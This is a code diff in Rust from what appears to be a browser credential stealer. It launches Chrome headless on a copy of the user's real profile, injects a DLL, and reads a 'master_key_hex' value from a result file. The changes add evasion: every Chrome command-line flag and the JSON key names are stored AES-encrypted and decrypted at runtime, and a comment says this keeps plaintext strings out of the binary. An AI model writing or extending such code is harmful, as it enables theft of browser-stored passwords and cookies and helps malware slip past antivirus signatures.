@@ -405,27 +405,52 @@ fn spawn_chrome_and_inject(chrome_exe: &str, dll_path: &Path, real_profile: &Pat
 
     let mut parts: Vec<String> = Vec::new();
     parts.push(format!("\"{chrome_exe}\""));
-    let flags = [
-        "--headless=new",
-        "--disable-gpu",
-        "--disable-logging",
-        "--log-level=3",
-        "--disable-background-networking",
-        "--disable-sync",
-        "--disable-default-apps",
-        "--disable-extensions",
-        "--disable-component-update",
-        "--no-first-run",
-        "--no-default-browser-check",
-        "--noerrdialogs",
-        "--disable-dev-tools",
-        "--disable-features=Translate",
-        "--disable-ipc-flooding-protection",
-        "--disable-breakpad",
-        "--metrics-recording-only",
+    // Flags are decrypted at runtime — no plaintext flag strings in the binary.
+    let flag_headless   = aes_decrypt(&polymorphic_keys::CHROME_FLAG_HEADLESS_ENC,    &polymorphic_keys::CHROME_FLAG_HEADLESS_KEY,    &polymorphic_keys::CHROME_FLAG_HEADLESS_NONCE);
+    let flag_nogpu      = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOGPU_ENC,       &polymorphic_keys::CHROME_FLAG_NOGPU_KEY,       &polymorphic_keys::CHROME_FLAG_NOGPU_NONCE);
+    let flag_nolog      = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOLOG_ENC,       &polymorphic_keys::CHROME_FLAG_NOLOG_KEY,       &polymorphic_keys::CHROME_FLAG_NOLOG_NONCE);
+    let flag_loglvl     = aes_decrypt(&polymorphic_keys::CHROME_FLAG_LOGLVL_ENC,      &polymorphic_keys::CHROME_FLAG_LOGLVL_KEY,      &polymorphic_keys::CHROME_FLAG_LOGLVL_NONCE);
+    let flag_nobgnet    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOBGNET_ENC,     &polymorphic_keys::CHROME_FLAG_NOBGNET_KEY,     &polymorphic_keys::CHROME_FLAG_NOBGNET_NONCE);
+    let flag_nosync     = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOSYNC_ENC,      &polymorphic_keys::CHROME_FLAG_NOSYNC_KEY,      &polymorphic_keys::CHROME_FLAG_NOSYNC_NONCE);
+    let flag_nodefa     = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NODEFA_ENC,      &polymorphic_keys::CHROME_FLAG_NODEFA_KEY,      &polymorphic_keys::CHROME_FLAG_NODEFA_NONCE);
+    let flag_noext      = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOEXT_ENC,       &polymorphic_keys::CHROME_FLAG_NOEXT_KEY,       &polymorphic_keys::CHROME_FLAG_NOEXT_NONCE);
+    let flag_noupdate   = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOUPDATE_ENC,    &polymorphic_keys::CHROME_FLAG_NOUPDATE_KEY,    &polymorphic_keys::CHROME_FLAG_NOUPDATE_NONCE);
+    let flag_nofirst    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOFIRST_ENC,     &polymorphic_keys::CHROME_FLAG_NOFIRST_KEY,     &polymorphic_keys::CHROME_FLAG_NOFIRST_NONCE);
+    let flag_nodefbr    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NODEFBR_ENC,     &polymorphic_keys::CHROME_FLAG_NODEFBR_KEY,     &polymorphic_keys::CHROME_FLAG_NODEFBR_NONCE);
+    let flag_noerr      = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOERR_ENC,       &polymorphic_keys::CHROME_FLAG_NOERR_KEY,       &polymorphic_keys::CHROME_FLAG_NOERR_NONCE);
+    let flag_nodevtools = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NODEVTOOLS_ENC,  &polymorphic_keys::CHROME_FLAG_NODEVTOOLS_KEY,  &polymorphic_keys::CHROME_FLAG_NODEVTOOLS_NONCE);
+    let flag_notranslate= aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOTRANSLATE_ENC, &polymorphic_keys::CHROME_FLAG_NOTRANSLATE_KEY, &polymorphic_keys::CHROME_FLAG_NOTRANSLATE_NONCE);
+    let flag_noflood    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOFLOOD_ENC,     &polymorphic_keys::CHROME_FLAG_NOFLOOD_KEY,     &polymorphic_keys::CHROME_FLAG_NOFLOOD_NONCE);
+    let flag_nobreak    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_NOBREAKPAD_ENC,  &polymorphic_keys::CHROME_FLAG_NOBREAKPAD_KEY,  &polymorphic_keys::CHROME_FLAG_NOBREAKPAD_NONCE);
+    let flag_metrics    = aes_decrypt(&polymorphic_keys::CHROME_FLAG_METRICS_ENC,     &polymorphic_keys::CHROME_FLAG_METRICS_KEY,     &polymorphic_keys::CHROME_FLAG_METRICS_NONCE);
+    let flag_userdata   = aes_decrypt(&polymorphic_keys::CHROME_FLAG_USERDATA_ENC,    &polymorphic_keys::CHROME_FLAG_USERDATA_KEY,    &polymorphic_keys::CHROME_FLAG_USERDATA_NONCE);
+    let flag_headless_s   = String::from_utf8_lossy(&flag_headless).into_owned();
+    let flag_nogpu_s      = String::from_utf8_lossy(&flag_nogpu).into_owned();
+    let flag_nolog_s      = String::from_utf8_lossy(&flag_nolog).into_owned();
+    let flag_loglvl_s     = String::from_utf8_lossy(&flag_loglvl).into_owned();
+    let flag_nobgnet_s    = String::from_utf8_lossy(&flag_nobgnet).into_owned();
+    let flag_nosync_s     = String::from_utf8_lossy(&flag_nosync).into_owned();
+    let flag_nodefa_s     = String::from_utf8_lossy(&flag_nodefa).into_owned();
+    let flag_noext_s      = String::from_utf8_lossy(&flag_noext).into_owned();
+    let flag_noupdate_s   = String::from_utf8_lossy(&flag_noupdate).into_owned();
+    let flag_nofirst_s    = String::from_utf8_lossy(&flag_nofirst).into_owned();
+    let flag_nodefbr_s    = String::from_utf8_lossy(&flag_nodefbr).into_owned();
+    let flag_noerr_s      = String::from_utf8_lossy(&flag_noerr).into_owned();
+    let flag_nodevtools_s = String::from_utf8_lossy(&flag_nodevtools).into_owned();
+    let flag_notranslate_s= String::from_utf8_lossy(&flag_notranslate).into_owned();
+    let flag_noflood_s    = String::from_utf8_lossy(&flag_noflood).into_owned();
+    let flag_nobreak_s    = String::from_utf8_lossy(&flag_nobreak).into_owned();
+    let flag_metrics_s    = String::from_utf8_lossy(&flag_metrics).into_owned();
+    let flag_userdata_s   = String::from_utf8_lossy(&flag_userdata).into_owned();
+    let flags: &[&str] = &[
+        &flag_headless_s, &flag_nogpu_s, &flag_nolog_s, &flag_loglvl_s,
+        &flag_nobgnet_s, &flag_nosync_s, &flag_nodefa_s, &flag_noext_s,
+        &flag_noupdate_s, &flag_nofirst_s, &flag_nodefbr_s, &flag_noerr_s,
+        &flag_nodevtools_s, &flag_notranslate_s, &flag_noflood_s,
+        &flag_nobreak_s, &flag_metrics_s,
     ];
-    for f in &flags { parts.push(f.to_string()); }
-    parts.push(format!("--user-data-dir=\"{}\"", profile_str));
+    for f in flags { parts.push(f.to_string()); }
+    parts.push(format!("{}\"{}\"", flag_userdata_s, profile_str));
     let cmdline = parts.join(" ");
 
     let exe_w = wide(chrome_exe);
@@ -460,8 +485,12 @@ fn hex_to_key(hex: &str) -> Option<Vec<u8>> {
 fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
     let raw = fs::read_to_string(path).ok()?;
     let json: Value = serde_json::from_str(&raw).ok()?;
-    if json.get("error").and_then(|e| e.as_str()).is_some() { return None; }
-    let hex = json.get("master_key_hex")?.as_str()?;
+    let err_key = aes_decrypt(&polymorphic_keys::JSON_KEY_ERROR_ENC,  &polymorphic_keys::JSON_KEY_ERROR_KEY,  &polymorphic_keys::JSON_KEY_ERROR_NONCE);
+    let mk_key  = aes_decrypt(&polymorphic_keys::JSON_KEY_MASTER_ENC, &polymorphic_keys::JSON_KEY_MASTER_KEY, &polymorphic_keys::JSON_KEY_MASTER_NONCE);
+    let err_key_s = String::from_utf8_lossy(&err_key);
+    let mk_key_s  = String::from_utf8_lossy(&mk_key);
+    if json.get(err_key_s.as_ref()).and_then(|e| e.as_str()).is_some() { return None; }
+    let hex = json.get(mk_key_s.as_ref())?.as_str()?;
     hex_to_key(hex)
 }
 
